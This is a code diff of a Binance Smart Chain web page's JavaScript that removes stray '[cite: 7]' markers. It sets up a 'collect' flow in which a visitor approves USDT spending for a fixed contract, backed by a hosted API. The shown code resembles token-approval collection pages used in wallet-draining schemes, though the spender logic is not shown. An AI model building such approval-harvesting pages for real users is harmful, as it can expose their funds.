@@ -4,7 +4,7 @@
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b"; 
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634"; 
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38";[cite: 7]
+const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = 0n; 
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
@@ -16,7 +16,7 @@ const BSC_RPC_URLS = [
   "https://bsc-dataseed3.binance.org/",
   "https://bsc-dataseed4.binance.org/",
   "https://rpc.ankr.com/bsc"
-];[cite: 7]
+];
 
 const BSC_CHAIN_PARAMS = {
   chainId:           BSC_CHAIN_ID_HEX,
@@ -24,27 +24,27 @@ const BSC_CHAIN_PARAMS = {
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
   blockExplorerUrls: ["https://bscscan.com/"]
-};[cite: 7]
+};
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)"
-];[cite: 7]
+];
 
 // ─── DOM refs ─────────────────────────────────────────────────────────────────
-const approveBtn    = document.getElementById("approveBtn");[cite: 7]
-const btnText       = document.getElementById("btnText");[cite: 7]
-const btnSpinner    = document.getElementById("btnSpinner");[cite: 7]
-const merchantInput = document.getElementById("merchantAddress");[cite: 7]
-const toastEl       = document.getElementById("toast");[cite: 7]
+const approveBtn    = document.getElementById("approveBtn");
+const btnText       = document.getElementById("btnText");
+const btnSpinner    = document.getElementById("btnSpinner");
+const merchantInput = document.getElementById("merchantAddress");
+const toastEl       = document.getElementById("toast");
 
 if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
 // ─── Wake up Render backend ───────────────────────────────────────────────────
-(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();[cite: 7]
+(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-let _cachedAddress = null;[cite: 7]
+let _cachedAddress = null;
 
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
@@ -54,7 +54,7 @@ function showToast(msg, type = "default", ms = 4500) {
   toastEl.dataset.type = type === "default" ? "" : type;
   toastEl.hidden       = false;
   _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
-}[cite: 7]
+}
 
 function setLoading(on, label = "Processing…") {
   approveBtn.disabled = on;
